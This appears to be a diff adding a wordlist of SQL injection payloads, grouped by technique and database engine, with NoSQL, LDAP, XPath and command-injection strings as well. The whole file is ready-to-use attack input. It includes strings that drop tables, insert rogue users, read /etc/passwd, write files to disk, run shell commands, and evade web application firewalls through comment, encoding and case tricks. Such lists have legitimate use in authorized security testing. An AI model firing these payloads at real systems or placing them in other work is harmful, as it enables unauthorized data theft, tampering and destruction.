@@ -1,0 +1,225 @@
+# Basic SQL Injection Payloads
+'
+"
+`
+')
+")
+`)
+';
+";
+`;
+'--
+"--
+`--
+' OR '1'='1
+" OR "1"="1
+` OR `1`=`1
+' OR 1=1--
+" OR 1=1--
+` OR 1=1--
+') OR ('1'='1
+") OR ("1"="1
+`) OR (`1`=`1
+
+# Union Based
+' UNION SELECT NULL--
+" UNION SELECT NULL--
+' UNION SELECT 1,2,3--
+" UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL--
+" UNION ALL SELECT NULL--
+' UNION SELECT user(),version(),database()--
+" UNION SELECT user(),version(),database()--
+
+# Error Based
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--
+" AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--
+' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--
+" AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--
+' AND EXP(~(SELECT * FROM (SELECT user())a))--
+" AND EXP(~(SELECT * FROM (SELECT user())a))--
+
+# Boolean Based
+' AND 1=1--
+" AND 1=1--
+' AND 1=2--
+" AND 1=2--
+' AND ASCII(SUBSTRING((SELECT user()),1,1))>70--
+" AND ASCII(SUBSTRING((SELECT user()),1,1))>70--
+
+# Time Based
+' AND (SELECT SLEEP(5))--
+" AND (SELECT SLEEP(5))--
+'; WAITFOR DELAY '00:00:05'--
+"; WAITFOR DELAY '00:00:05'--
+' AND pg_sleep(5)--
+" AND pg_sleep(5)--
+' AND BENCHMARK(5000000,SHA1(1))--
+" AND BENCHMARK(5000000,SHA1(1))--
+
+# Stacked Queries
+'; INSERT INTO users (username, password) VALUES ('admin', 'password')--
+"; INSERT INTO users (username, password) VALUES ('admin', 'password')--
+'; DROP TABLE users--
+"; DROP TABLE users--
+'; CREATE TABLE test (id INT)--
+"; CREATE TABLE test (id INT)--
+
+# Information Schema
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+" UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+" UNION SELECT column_name,NULL FROM information_schema.columns--
+' UNION SELECT schema_name,NULL FROM information_schema.schemata--
+" UNION SELECT schema_name,NULL FROM information_schema.schemata--
+
+# Database Specific
+## MySQL
+' UNION SELECT version(),user(),database()--
+" UNION SELECT version(),user(),database()--
+' UNION SELECT @@version,@@hostname,@@datadir--
+" UNION SELECT @@version,@@hostname,@@datadir--
+' AND LOAD_FILE('/etc/passwd')--
+" AND LOAD_FILE('/etc/passwd')--
+
+## PostgreSQL
+' UNION SELECT version(),current_user,current_database()--
+" UNION SELECT version(),current_user,current_database()--
+' UNION SELECT pg_read_file('/etc/passwd',0,1000000)--
+" UNION SELECT pg_read_file('/etc/passwd',0,1000000)--
+
+## MSSQL
+' UNION SELECT @@version,system_user,db_name()--
+" UNION SELECT @@version,system_user,db_name()--
+' AND OPENROWSET('SQLOLEDB','';'sa';'password','SELECT name FROM master..sysdatabases')--
+" AND OPENROWSET('SQLOLEDB','';'sa';'password','SELECT name FROM master..sysdatabases')--
+
+## Oracle
+' UNION SELECT banner,NULL FROM v$version--
+" UNION SELECT banner,NULL FROM v$version--
+' UNION SELECT user,NULL FROM dual--
+" UNION SELECT user,NULL FROM dual--
+
+## SQLite
+' UNION SELECT sql,NULL FROM sqlite_master--
+" UNION SELECT sql,NULL FROM sqlite_master--
+' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
+" UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
+
+# WAF Bypass
+'/**/OR/**/1=1--
+"/**/OR/**/1=1--
+'+OR+1=1--
+"+OR+1=1--
+'%20OR%201=1--
+"%20OR%201=1--
+'/**/UNION/**/SELECT/**/NULL--
+"/**/UNION/**/SELECT/**/NULL--
+'%0AUNION%0ASELECT%0ANULL--
+"%0AUNION%0ASELECT%0ANULL--
+
+# Encoding
+%27%20OR%201=1--
+%22%20OR%201=1--
+&#39; OR 1=1--
+&#34; OR 1=1--
+\' OR 1=1--
+\" OR 1=1--
+
+# Double Encoding
+%2527%20OR%201=1--
+%2522%20OR%201=1--
+
+# Case Variation
+' oR 1=1--
+" oR 1=1--
+' UnIoN sElEcT nUlL--
+" UnIoN sElEcT nUlL--
+
+# Special Characters
+' OR '1'='1'/*
+" OR "1"="1"/*
+' OR 1=1#
+" OR 1=1#
+' OR 1=1;%00
+" OR 1=1;%00
+
+# NoSQL Injection (MongoDB)
+{$ne: null}
+{$regex: ".*"}
+{$where: "this.username == this.password"}
+{$gt: ""}
+' || '1'=='1
+" || "1"=="1
+
+# LDAP Injection
+*)(uid=*))(|(uid=*
+*)(|(mail=*))
+*)(|(cn=*))
+
+# XPath Injection
+' or '1'='1
+" or "1"="1
+'] | //user/*[contains(*,'Admin')] | a['
+"] | //user/*[contains(*,'Admin')] | a["
+
+# Command Injection (when SQL injection leads to command execution)
+'; exec('ls')--
+"; exec('ls')--
+'; system('whoami')--
+"; system('whoami')--
+
+# File Operations
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+" UNION SELECT LOAD_FILE('/etc/passwd')--
+' INTO OUTFILE '/tmp/test.txt'--
+" INTO OUTFILE '/tmp/test.txt'--
+
+# Advanced Payloads
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+" AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+' AND EXISTS(SELECT * FROM users WHERE username='admin')--
+" AND EXISTS(SELECT * FROM users WHERE username='admin')--
+
+# Conditional Responses
+' AND CASE WHEN (1=1) THEN 1 ELSE 0 END--
+" AND CASE WHEN (1=1) THEN 1 ELSE 0 END--
+' AND IF(1=1,1,0)--
+" AND IF(1=1,1,0)--
+
+# Second Order SQL Injection
+admin'--
+test'; DROP TABLE users--
+user'; INSERT INTO users VALUES ('hacker', 'password')--
+
+# Blind SQL Injection
+' AND (SELECT SUBSTRING(user(),1,1))='r'--
+" AND (SELECT SUBSTRING(user(),1,1))='r'--
+' AND (SELECT LENGTH(user()))=14--
+" AND (SELECT LENGTH(user()))=14--
+
+# Column Number Discovery
+' ORDER BY 1--
+" ORDER BY 1--
+' ORDER BY 100--
+" ORDER BY 100--
+' GROUP BY 1--
+" GROUP BY 1--
+
+# Comment Variations
+'-- 
+"-- 
+'#
+"#
+'/*
+"/*
+'; --
+"; --
+
+# Function Calls
+' AND CHAR(65)='A'--
+" AND CHAR(65)='A'--
+' AND ASCII('A')=65--
+" AND ASCII('A')=65--
+' AND HEX('admin')='61646D696E'--
+" AND HEX('admin')='61646D696E'-- 
